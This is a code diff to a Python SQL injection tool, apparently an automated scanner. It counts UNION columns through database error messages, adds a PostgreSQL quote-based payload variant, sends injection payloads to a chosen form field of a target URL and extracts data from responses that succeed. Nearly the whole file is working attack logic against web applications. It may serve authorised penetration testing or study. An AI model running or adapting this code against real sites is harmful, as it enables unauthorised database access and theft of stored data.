@@ -1,10 +1,11 @@
 import requests
+import sys
 from colorama import Fore, Style
 from extract_data import extract_data
-from utils import write_to_file
+from utils import write_to_file, vulnerable
 
 
-def check_response(response, payload):
+def check_response(response):
     """
     Check data from the response to check for vulnerabilities
     """
@@ -15,8 +16,10 @@ def check_response(response, payload):
         "The used SELECT statements have a different number of columns",
         "Unknown column",
         "SQL syntax",
+        "each UNION query must have the same number of columns"
         ]
     response_text = response.content.decode().lower()
+    print(f"response text: {response_text}")
     for error_msg in error_msgs:
         if error_msg.lower() in response_text:
             return False
@@ -24,12 +27,15 @@ def check_response(response, payload):
     return True
 
 
-def test_union_column_count(url, http_method, data, vulnerable_field):
+def test_union_column_count(url, http_method, data, vulnerable_field, db):
     """
     Test for the number of columns in the union query
     """
     print(f"{Fore.LIGHTBLUE_EX}[*] Testing Union-Based SQL Injection...{Style.RESET_ALL}")
-    base_payload = "1 UNION ALL SELECT "
+    if "postgresql" == db:
+        base_payload = "1' UNION ALL SELECT "
+    else:
+        base_payload = "1 UNION ALL SELECT "
     max_columns = 10
     for columns in range(1, max_columns + 1):
         payload = base_payload + ",".join(map(str, range(1, columns + 1)))
@@ -42,7 +48,7 @@ def test_union_column_count(url, http_method, data, vulnerable_field):
         else:
             print(f"{Fore.RED}[-] Invalid HTTP method!{Style.RESET_ALL}")
             return
-        if check_response(response, payload):
+        if check_response(response):
             return columns
     print(f"{Fore.RED}[-] Number of columns not found!{Style.RESET_ALL}")
 
@@ -61,6 +67,7 @@ def send_payload(url, http_method, data, vulnerable_field, payload):
     Send the payload to the target website
     """
     data[vulnerable_field] = payload
+    print(f"sending: {data}")
     if http_method == "get":
         response = requests.get(url, params=data)
     elif http_method == "post":
@@ -71,7 +78,7 @@ def send_payload(url, http_method, data, vulnerable_field, payload):
     return response
 
 
-def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file):
+def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file, db):
     """
     Test SQLi payloads with a known number of columns
     """
@@ -98,14 +105,15 @@ def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, 
     for base_payload in payloads:
         payload = generate_payload(base_payload, columns)
         response = send_payload(url, http_method, data, vulnerable_field, payload)
-        if check_response(response, payload):
+        if vulnerable(response):
             print(f"{Fore.LIGHTGREEN_EX}[+] Payload success: {payload}{Style.RESET_ALL}")
             extract_data(response, file, payload, vulnerable_field)
         else:
             print(f"{Fore.RED}[-] Failed to send payload: {payload}{Style.RESET_ALL}")
+    sys.exit(1)
 
 
-def test_mysql(url, http_method, data, vulnerable_field, file):
+def test_mysql(url, http_method, data, vulnerable_field, file, db):
     """
     Wrapper function to test MySQL vulnerabilities
     """
@@ -114,5 +122,5 @@ def test_mysql(url, http_method, data, vulnerable_field, file):
         file,
         f"[*] Testing MySQL vulnerabilities..."
     )
-    columns = test_union_column_count(url, http_method, data, vulnerable_field)
-    exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file)
+    columns = test_union_column_count(url, http_method, data, vulnerable_field, db)
+    exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file, db)
